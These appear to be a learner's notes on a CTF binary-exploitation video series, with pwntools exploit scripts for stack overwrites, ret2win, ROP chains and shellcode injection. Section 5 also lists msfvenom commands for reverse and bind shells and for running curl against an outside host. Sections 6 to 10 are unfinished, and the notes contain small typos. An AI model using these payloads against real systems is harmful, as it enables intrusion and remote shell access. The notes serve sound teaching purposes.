# CryptoCat Binary Exploitation Series
Video Series: https://www.youtube.com/watch?v=jrG1Gqatj7U&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&index=2
Github: https://www.youtube.com/watch?v=i2ypCsB93gM


### Table of Contents: CryptoCat Binary Exploitation
   1.  Overwriting a Variable on the Stack
   2.  Overwriting Variables on the Stack
   2.  Return to Win (Ret2Win) Buffer Overflow
   4.  Ret2Win with Function Parameters (x86/x64)
   5.  Injecting Shellcode (Shellcraft/MSFVenom)
   6.  Return to Lib-C (ret2system/one_gadget)
   7.  Format String Vulnerabilities (printf)
   8.  Leak PIE (bypass) and Lib-C (ret2system)
   9.  Overwriting Global Offset Table (GOT) Entries with printf()
   10. Bypassing Stack Canaries (leak+write)

### Useful Notes for this Series
**Use `checksec` to see binary permissions**

**Compiling Source With No Protections**
```
gcc code.c -o output -fno-stack-protector -z execstack -no-pie -m32
```

**Github Python Script using Ghidra**
Github: `liba2k/ghidra.py`
Example Use: `ghidra_auto <binary>`

**Ghidra TIPS**
+ If using _Ghidra_, you'll see `== <seemingly_random_hex>`
 - Either look the `Listing` disassembly window...
 - Or _right-click -> Char:_ to convert in `Decompile` window
 
**When a Function get called ...**
+ The `return pointer` is pushed onto the stack
 - so it knows where to return to 
+ Then the `function parameters` are pushed onto the stack
 
----------------------------------------------------------------------

## ==================================================================

## (1) Overwriting a Variable on the Stack
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/01-overwriting_stack_variables_part1

  1. Use `ltarce` while using executing the binary 
    + `ltarce ./login`
    + My input: `test`
    + Technically you can see the password here, but ignore this
    
  2. Give a large input and see if you get a _Segmentation Fault_
    + `./login`
    + `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`
    
  3. Find the input length that triggers the _Segmentation Fault_
    + You can open the binary in _Ghidra_ or read the _source code_
      and see that the `array's length` is **6**
      
  4. Observe the binary with `pwndbg` and set a breakpoint right before the
     compare that you saw in the disassembly(_Ghidra_)
    + `cmp dword ptr [ebp - 0xc], 0`
    + Technically you find the hardcoded key in one of the registers
      (or at least a pointer to it), but we'll ignore this
    
  5. Use `pwntools` for exploit script
     ```
     from pwn import *
     
     # Start program
     io = process('./login')
     
     # Send string to overflow buffer
     io.sendlineafter(b':', b'AAAAAAA')
     
     # Receive output
     print(io.recvall().decode())
     ```



## ==================================================================

## (2) Overwriting Variables on the Stack
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/02-overwriting_stack_variables_part2

   1. Observe _source code_ or _Ghidra_ to see:
     + That there is an array of length `32`
     + That the **hard coded key** is `0xdeadbeef`
     + Could give binary pattern and observe the results, but this was easier 
     
   2. If using _Ghidra_, you'll see `== <seemingly_random_hex>`
     + Either look the `Listing` disassembly window...
     + Or _right-click -> Char:_ to convert in `Decompile` window
     
   3. You'll see that the variable `key` is right **after the buffer**
     + We're going to overflow and overwrite that variable
   
   4. Manual exploit: `python2 -c "print 32*'A' + '\xef\xbe\xad\xde'" > output`
      - format is because we're looking at a _little endian_ architecture
     + `gdb <binary>`
     + `pwndbg> run < output`
   
   5. `pwntools` exploit script 
     ```
      from pwn import *

      # Start program
      io = process('./overwrite')
      
      # Send string to overflow buffer
      io.sendlineafter(b'?', b'A' * 32 + p32(0xdeadbeef))
      
      # Receive output
      print(io.recvall().decode())
     ```
  
## ==================================================================

## (3) Return to Win (Ret2Win) Buffer Overflows
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/03-return_to_win

   1. Look at _source code_ and see the `scanf("%s", buffer);`
     + Overflow here
     
   2. Since **No ASLR/PIE** get the _address to_ the `hacked()` function 
     + `r2 ret2win`
     + `[]> aaa`
     + `[]> afl`
     + Get the address of `sym.hacked`
      - `0x08049182`
     
   3. Use `pwndbg`
     + Use `cyclic` to find the `EIP` offset (it's **28** in this case)
     
   4. Check a successful spacing: `python2 -c "print 'A'*28 + 'B'*4 + 'C'*32" > output`
     + Check this gdb 
     + `gdb <binary>`
     + `pwndbg> run < output`
     
   5. Manual Exploit with hardcoded address from step 2 above ()
     + `python2 -c "print 'A'*28 + '\x82\x91\x04\x08'" > output`
      - format is because we're looking at a _little endian_ architecture
     + `gdb <binary>`
     + `pwndbg> run < output`
     
     
### 6. Write Exploit Script
   ```exploit.py
      from pwn import *

      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Set up pwntools for the correct architecture
      exe = './ret2win'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Change logging level to help with debugging (error/warning/info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      io = start()
      
      # How many bytes to the instruction pointer (EIP)?
      padding = 28
      
      payload = flat(
          b'A' * 28,
          0x8049182 # elf.functions.hacked  # 0x401142
      )
      
      # Save the payload to file
      write('payload', payload)
      
      # Send the payload
      io.sendlineafter(b':', payload)
      
      # Receive the flag
      io.interactive()
   ```
   
### 7. Here is an automated script that uses ROP (return-oriented-programming)
   ```ropstar.py
      from pwn import *
      
      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Set up pwntools for the correct architecture
      exe = './ret2win'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Change logging level to help with debugging (error/warning/info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      io = start()
      
      # We will send a 'cyclic' pattern which overwrites the return address on the stack
      payload = cyclic(50)
      
      # PWN
      io.sendlineafter(b'Name:', payload)
      
      # Wait for the process to crash
      io.wait()
      
      # Open up the corefile
      core = io.corefile
      
      # Print out the address of EIP at the time of crashing
      eip_value = core.eip
      eip_offset = cyclic_find(eip_value)
      info('located EIP offset at {a}'.format(a=eip_offset))
      
      # Create ROP object
      rop = ROP(elf)
      # Call the hacked function
      rop.hacked()
      
      # Dump out the rop structure
      print(rop.dump())
      # pprint(rop.gadgets)
      
      # Get the raw bytes
      rop_chain = rop.chain()
      
      # Build payload
      payload = flat({
          eip_offset: rop_chain
      })
      
      # Save payload to file
      write('payload', payload)
      
      # Start a new process
      io = start()
      
      # PWN
      io.sendlineafter(b'Name:', payload)
      
      # Receive the flag
      io.interactive()
   ```

## ==================================================================

## (4) Ret2Win with Function Parameters (x86/x64)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/04-ret2win_with_params

   1. Look at _source code_ and see the `scanf("%s", buffer);`
     + Overflow here
     
   2. Since **No ASLR/PIE** get the _address to_ the `hacked()` function 
     + `r2 ret2win`
     + `[]> aaa`
     + `[]> afl`
     + Get the address of `sym.hacked`
      - `0x08049182`
     
   3. Use `pwndbg`
     + Use `cyclic` to find the `EIP` offset (it's **28** in this case)
     
   4. Check a successful spacing: `python2 -c "print 'A'*28 + 'B'*4 + 'C'*32" > output`
     + Check this gdb 
     + `gdb <binary>`
     + `pwndbg> run < output`
     
   5. Manual Exploit with hardcoded address from step 2 above ()
     + `python2 -c "print 'A'*28 + '\x82\x91\x04\x08'" > output`
      - format is because we're looking at a _little endian_ architecture
     + `gdb <binary>`
     + `pwndbg> run < output`
     + You'll get a print statemend saying you're **unauthorized**
     
   6. However, this `hacked()` function takes in **2 function parameters**
     + If you look at _source code_ or _Ghidra_, you see:
       `if(first == 0xdeadbeef && second == 0xc0debabe){`

### 7. Write exploit script that _provides these parameters_
      ```
      from pwn import *

      # Allows easy swapping betwen local/remote/debug modes
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      
      def find_ip(payload):
          # Launch process and send payload
          p = process(exe)
          p.sendlineafter(b':', payload)
          # Wait for the process to crash
          p.wait()
          # Print out the address of EIP/RIP at the time of crashing
          ip_offset = cyclic_find(p.corefile.pc)  # x86
          # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
          info('located EIP/RIP offset at {a}'.format(a=ip_offset))
          return ip_offset
      
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      
      # Set up pwntools for the correct architecture
      exe = './ret2win_params'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Enable verbose logging so we can see exactly what is being sent (info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      # Pass in pattern_size, get back EIP/RIP offset
      offset = find_ip(cyclic(200))
      
      # Start program
      io = start()
      
      # Build the payload
      payload = flat({
          offset: [
              # 32-bit the params follow the function
              elf.functions.hacked,
              0x0,  # Return pointer - try changing to main() and step through with GDB!
              0xdeadbeef,  # Param_1
              0xc0debabe,  # Param_2
          ]
      })
      
      # Save the payload to file
      write('payload', payload)
      
      # Send the payload
      io.sendlineafter(b':', payload)
      
      # Get flag
      io.interactive()
      ```
      
### 8. Automated script that uses ROP 
      ```
      from pwn import *

      # Allows easy swapping betwen local/remote/debug modes
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      def find_ip(payload):
          # Launch process and send payload
          p = process(exe)
          p.sendlineafter(b':', payload)
          # Wait for the process to crash
          p.wait()
          # Print out the address of EIP/RIP at the time of crashing
          ip_offset = cyclic_find(p.corefile.pc)  # x86
          # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
          info('located EIP/RIP offset at {a}'.format(a=ip_offset))
          return ip_offset
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Set up pwntools for the correct architecture
      exe = './ret2win_params'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Enable verbose logging so we can see exactly what is being sent (info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      # Pass in pattern_size, get back EIP/RIP offset
      offset = find_ip(cyclic(200))
      
      # Start program
      io = start()
      
      # ROP object
      rop = ROP(elf)
      rop.hacked(0xdeadbeef, 0xc0debabe)
      
      # Build the payload
      payload = flat({
          offset: rop.chain()
      })
      
      # Save the payload to file
      write('payload', payload)
      
      # Send the payload
      io.sendlineafter(b':', payload)
      
      # Get flag
      io.interactive()     
      ```

## ==================================================================

## (5) Injecting Shellcode (Shellcraft/MSFVenom)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/05-injecting_custom_shellcode

   1. You'll see `setuid(0);` and `setgid(0)` in _source code_
     + In Linux, 0 is the uid for root
     
   2. Do the usual stuff like above to find the offset and whatnot 
   
   3. Once you inject shellcode, you'll jump back to the stack to execute 
     + You'll use the `jmp esp to do this`
   
### 4. Use `shellcraft` to craft exploit 
     + `shellcraft i386.linux.sh -f a`
      - This formats the shellcode in assembly
     + shellcraft script 
     ```
      from pwn import *
      
      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      # Specify GDB script here (breakpoints etc)
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Binary filename
      exe = './server'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Change logging level to help with debugging (error/warning/info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      io = start()
      
      # Offset to EIP
      padding = 76
      
      # Assemble the byte sequence for 'jmp esp' so we can search for it
      jmp_esp = asm('jmp esp')
      jmp_esp = next(elf.search(jmp_esp))
      
      # Print flag
      shellcode = asm(shellcraft.cat('flag.txt'))
      # shellcode = asm(shellcraft.sh())
      # Exit
      shellcode += asm(shellcraft.exit())
      
      # Build payload
      payload = flat(
          asm('nop') * padding,
          jmp_esp,
          asm('nop') * 16,
          shellcode
      )
      
      # Write payload to file
      write("payload", payload)
      
      # Exploit
      io.sendlineafter(b':', payload)
      
      # Get flag/shell
      io.interactive()
     ```

### 5. Use `msfvenom` to craft exploit
      ```
      from pwn import *
      
      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      # Specify GDB script here (breakpoints etc)
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Binary filename
      exe = './server'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Change logging level to help with debugging (error/warning/info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      io = start()
      
      # Offset to EIP
      padding = 76
      
      # Assemble the byte sequence for 'jmp esp' so we can search for it
      jmp_esp = asm('jmp esp')
      jmp_esp = next(elf.search(jmp_esp))
      
      # msfvenom -p linux/x86/exec CMD="curl https://en4i3omt29wvgco.m.pipedream.net" -b '\x00' -f python
      # msfvenom -p linux/x86/shell_bind_tcp PORT=1337 -b '\x00' -f python
      # msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python
      # msfvenom -p linux/x86/read_file PATH=flag.txt FD=2 -b '\x00' -f python
      
      # Exploit
      buf = b""
      buf += b"\xb8\xa4\xe4\x0d\x3b\xda\xd2\xd9\x74\x24\xf4\x5b\x31"
      buf += b"\xc9\xb1\x12\x31\x43\x14\x83\xc3\x04\x03\x43\x10\x46"
      buf += b"\x11\xe6\x0d\x3e\xdf\xf9\x71\x3e\xbb\xc8\xb8\xf3\xbb"
      buf += b"\xa2\xf8\xb3\xbf\xb4\xfe\xc3\x36\x53\x77\x3a\xf2\x9c"
      buf += b"\x98\xbc\x03\x50\x18\x35\xc1\xd2\x1d\x45\xc6\x22\xa5"
      buf += b"\x47\xc6\x22\xd9\x8a\x46\x9a\xd8\x14\x47\xdb\x61\x14"
      buf += b"\x47\xdb\x95\xd9\xc7\x33\x50\x1e\x38\x3c\x3d\x8c\xa6"
      buf += b"\xa4\xec\x38\x51\x5f\xf1"
      
      # Build payload
      payload = flat(
          asm('nop') * padding,
          jmp_esp,
          asm('nop') * 16,
          buf
      )
      
      # Write payload to file
      write("payload", payload)
      
      # Exploit
      io.sendlineafter(b':', payload)
      
      # Get flag/shell
      io.interactive()
      ```

## ==================================================================

## (6) Return to Lib-C (ret2system/one_gadget)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/06-return_to_libc

**NX is ENABLED** (meaning I won't be able to execute on the stack)

   1. You'll see `setuid(0);` and `setgid(0);` in _source code_
     + In Linux, 0 is the uid for root
     
   2. Do the usual stuff like above to find the offset and whatnot 
   
   3. Once you inject shellcode, you'll jump back to the stack to execute 
     + You'll use the `jmp esp` to do this
     
   4. Check the `.got.plt` to see the address of the `gets()` function in _Ghidra_
     + **ASLR/PIE is disabled** in this example
     
   5. 

## ==================================================================

## (7) Format String Vulnerabilities (printf)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/07-format_string_vulns



## ==================================================================

## (8) Leak PIE (bypass) and Lib-C (ret2system)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/08-leak_pie_ret2libc



## ==================================================================

## (9) Overwriting Global Offset Table (GOT) Entries with printf()
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/09-overwriting_got



## ==================================================================

## (10) Bypassing Stack Canaries (leak+write)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/10-bypassing_canaries



## ==================================================================
-
